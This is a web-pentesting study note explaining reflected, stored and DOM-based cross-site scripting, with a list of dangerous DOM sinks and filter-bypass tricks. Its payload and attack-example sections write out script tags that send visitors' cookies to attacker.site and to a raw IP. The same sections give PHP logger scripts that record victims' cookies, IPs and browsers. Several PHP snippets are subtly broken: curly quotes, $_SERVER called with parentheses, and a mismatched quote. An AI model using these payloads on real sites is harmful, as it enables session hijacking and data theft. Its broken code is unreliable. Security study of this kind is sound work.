---
title: XSS attack - Cross-Site Scripting
author: amandaguglieri
draft: false
TableOfContents: true
tags:
  - web pentesting
  - attack
  - xss
---

# XSS attack - Cross-Site Scripting

**Cross-Site Scripting** attacks or **XSS** attacks enable attackers to inject client-side scripts into web pages. This is done through an URL than the attacker sends. Crafted in the URL, this js payload is injected.

```
# Quick steps to test XSS 
# 1. Find a reflection point (inspect source code and expand all tags to make sure that it's really a reflection point and it's not parsing your input)
# 2. Test with <i> tag
# 3. Test with HTML/JavaScript code (alert('XSS'))
```

But, of course, you may use an extensive repository of payloads. This [OWASP cheat sheet](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html) is kind of a bible.


## Cross-Site Scripting XSS: reflected, persistent or DOM based

**Reflected attacks**: malicious payload is carried inside the request that the browser sends. You need to bypass the anti-xss filters. This way when the victim clicks on it it will be sending their information to the attacker (limited to js events).  

Example:

```
http://victim.site/seach.php?find=<payload>
```

**Persistent or stored XSS attacks**: payload is sent to the web server and then stored. The most common vector for these attacks are HTML forms that submit content to the web server and then display that content back to the users (comments, user profiles, forum posts…). Basically if the url somehow stays in the server, then, every time that someone accesses to it, they will suffer the attack.

**DOM based** XSS attacks: tricky one. This time the javascript file procedes from the server, and in that sense, the file is trusteable. Nevertheless, the file modifies changes in the web structure. [Quoting OWASP](https://owasp.org/www-community/attacks/DOM_Based_XSS): "DOM Based XSS (or as it is called in some texts, “type-0 XSS”) is an XSS attack wherein the attack payload is executed as a result of modifying the DOM “environment” in the victim’s browser used by the original client side script, so that the client side code runs in an unexpected manner".


## Mitigation for cookie stealing

Depending on Enabling the HTTPOnly flag.


## Crafted payloads

```html
<script>alert(‘lala’)</script>

<script>alert(document.cookie)</script>

<script>
var i = new Image();
i.src = “http://attacker.site/log.php?q=”+document.cookie;
</script>
```

Now, this script save the cookie in a text file on the attacker site:

```php
	<?php
		$filename=”/tmp/log.txt”;
		$fp=fopen($filename, ‘a’);
		$cookie=$_GET[‘q`];
		fwrite($fp, $cookie);
		fclose($fp);
	?>
```

## Example of an attack

1. The attacker creates a get.php file and saves it into its server. 

2. This php file will store the data that the attacker server receives into a file.

3. This could be the content of the get.php file:

```php
<?php
	$ip = $_SERVER(‘REMOTE_ADDR’);
	$browser = $_SERVER(‘HTTP_USER_AGENT’);

	$fp = fopen(‘jar.txt’, ‘a’);

fwrite($fp, $ip . ‘ ‘ . $browser . “ \n”);
fwrite($fp, urldecode($_SERVER[‘QUERY_STRING’]) . “ \n\n”);
fclose($fp);
?>
```

4. Now in the web server the attacker achieve to store this payload:

```html
<script>
var i = new Image();
i.src = “http://attacker.site/get.php?cookie=”+escape(document.cookie);
</script>

# Or in one line:
<script>var i = new Image(); i.src = “http://10.86.74.7/moville.php?cookie=”+escape(document.cookie); </script>
```


## DOM-based cross-site scripting attack

To deliver a DOM-based XSS attack, you need to place data into a source so that it is propagated to a sink and causes execution of arbitrary JavaScript.
The most common source for DOM XSS is the URL, which is typically accessed with the `window.location` object.

What is a sink? A sink is a potentially dangerous JavaScript function or DOM object that can cause undesirable effects if attacker-controlled data is passed to it. For example, the `eval()` function is a sink because it processes the argument that is passed to it as JavaScript. An example of an HTML sink is `document.body.innerHTML` because it potentially allows an attacker to inject malicious HTML and execute arbitrary JavaScript.

Summing up: you should avoid allowing data from any untrusted source to be dynamically written to the HTML document.

Tools: BurpSuite Web Vulnerability scanner.

Which sinks can lead to DOM-XSS vulnerabilities:

- document.write()
- document.writeln() 
- document.domain 
- element.innerHTML 
- element.outerHTML 
- element.insertAdjacentHTML 
- element.onevent


## Bypassing techniques

```
# Using uppercase and lowercase

# If first <script is removed, insert one script into another:
<scr<script>ipt>

# It single quotation (or even double quotes) is removed, you can use the function String.fromCharCode(number, number, number, number)
# 1. We lookk for a charcode calculator and enter our payload, for instance "lala" will be: 
34, 108, 97, 108, 97, 34
# 2. Them we put those numbers in our payload
<scRIpt>alert(String.fromCharCode(34, 108, 97, 108, 97, 34))</sCRiPt>

```




## Tools and payloads

+ See updated chart: [Attacks and tools for web pentesting](web-security-testing-guide.md).
+ Vectors (payload) regularly updated: [https://portswigger.net/web-security/cross-site-scripting/cheat-sheet](https://portswigger.net/web-security/cross-site-scripting/cheat-sheet).
+ OWASP Cheat Sheet series: XSS Filter Evasion Cheat Sheet: [https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html](https://cheatsheetseries.owasp.org/cheatsheets/XSS_Filter_Evasion_Cheat_Sheet.html).
 






